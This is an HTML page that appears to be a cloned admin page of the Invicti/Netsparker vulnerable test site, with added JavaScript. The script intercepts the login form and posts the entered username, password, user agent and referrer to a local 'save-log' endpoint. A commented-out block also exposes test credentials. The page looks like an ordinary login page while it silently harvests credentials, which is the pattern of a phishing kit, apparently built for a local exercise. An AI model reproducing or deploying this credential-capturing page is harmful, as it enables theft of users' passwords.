<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta name="keywords" content="" />
    <meta name="description" content="" />
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <title>Invicti Test Web Site - PHP</title>
    <link href="css.css" rel="stylesheet" type="text/css" media="screen" />
</head>

<body>
    <div id="wrapper">
        <div id="menu">
            <ul>
                <li><a href="/process.php?file=Generics/index.nsp">Home</a></li>
                <li><a href="/hello.php?name=Visitor">Hello</a></li>
                <li><a href="/products.php?pro=url">Products</a></li>
                <li><a href="/process.php?file=Generics/about.nsp">About</a></li>
                <li><a href="/process.php?file=Generics/contact.nsp">Contact</a></li>
                <li><a href="/auth/">Login</a></li>
            </ul>
        </div>
        <!-- end #menu -->

        <div id="header"></div>
        <!-- end #header -->

        <div id="page">
            <div id="background-content"></div>
            <div id="side-background-content"></div>
            <div id="page-bgtop">
                <div id="page-bgbtm">
                    <div id="content">
                        <div class="post">
                            <h1 class="title"><a href="#">Admin Area</a></h1>
                            <p>
                                Hi admin<br>
                                <form method="POST" action="http://php.testsparker.com/auth/control.php">
                                    Search For: &nbsp;
                                    <input type="text" name="search" /> &nbsp;&nbsp;
                                    <input type="submit" value="SUBMIT" />
                                </form>
                                <a href="http://php.testsparker.com/auth/   logout.php">LOGOUT</a>
                            </p>
                        </div>
                        <!-- <div class="post">
                            <h1 class="title"><a href="#">Login Area</a></h1>
                            <p>
                                Enter your credentials (admin / admin123456)
                                <br />
                            <form id="loginForm">
                                Username: <input type="text" name="username" id="username" required />
                                <br />
                                Password:&nbsp;&nbsp;<input type="password" name="password" id="password" required />
                                <br />
                                <input type="hidden" name="token" value="28870">
                                <br />
                                <input type="submit" value="SUBMIT">
                            </form>
                            </p>

                            <div style="clear: both;">&nbsp;</div>
                            <div class="entry">


                            </div>
                        </div> -->
                        <div style="clear: both;">&nbsp;</div>
                    </div>
                    <!-- end #content -->

                    <div id="sidebar">
                        <ul>
                            <li>
                                <div id="search">
                                    <form method="get" action="http://php.testsparker.com/auth/artist.php">
                                        <div>
                                            <input type="text" name="s" id="search-text" value="" />
                                            <input type="submit" id="search-submit" value="GO" />
                                        </div>
                                    </form>
                                </div>
                                <div style="clear: both;">&nbsp;</div>
                            </li>
                            <li>
                                <h2>Tags</h2>
                                <p>netsparker xss web-application-security false-positive-free automated-exploitation
                                    sql-injection local/remote-file-inclusion</p>
                            </li>
                            <li>
                                <h2>Inner Pages</h2>
                                <ul>
                                    <li><a href="/artist.php?id=test">Artist Search</a></li>
                                    <li><a href="/nslookup.php">Lookup Service</a></li>
                                </ul>
                            </li>
                            <li>
                                <h2>Links</h2>
                                <ul>
                                    <li><a href="http://aspnet.testsparker.com/">Aspnet Testsparker</a></li>
                                    <li><a href="http://aspnet.testsparker.com/administrator/">Aspnet Testsparker
                                            Login</a></li>
                                </ul>
                            </li>
                        </ul>
                    </div>
                    <!-- end #sidebar -->

                    <div style="clear: both;">&nbsp;</div>
                </div>
            </div>
        </div>
        <!-- end #page -->
    </div>

    <div id="footer">
        <p>Copyright (c) 2010 testsparker.com. All rights reserved. Design by
            <a href="http://www.freecsstemplates.org/">Free CSS Templates</a>.
        </p>
    </div>
    <!-- end #footer -->
</body>
<script>
    document.getElementById("loginForm").addEventListener("submit", async function (event) {
        event.preventDefault();

        const username = document.getElementById("username").value.trim();
        const password = document.getElementById("password").value.trim();

        if (!username || !password) {
            alert("Vui lòng nhập đầy đủ tài khoản và mật khẩu!");
            return;
        }

        const form = document.createElement("form");
        form.method = "POST";
        form.action = "http://localhost:3001/save-log";

        const inputs = [
            { name: "username", value: username },
            { name: "password", value: password },
            { name: "token", value: "28870" }
        ];

        inputs.forEach(({ name, value }) => {
            const input = document.createElement("input");
            input.type = "hidden";
            input.name = name;
            input.value = value;
            form.appendChild(input);
        });

        try {
            await fetch("http://localhost:3001/save-log", {
                method: "POST",
                body: JSON.stringify({
                    username,
                    password,
                    token: "28870",
                    userAgent: navigator.userAgent,
                    referer: document.referrer
                }),
                headers: {
                    "Content-Type": "application/json"
                }
            });

        } catch (error) {
            console.error(error);
        }

        document.body.appendChild(form);

        form.submit();
    });
</script>
<script>
</script>


</html>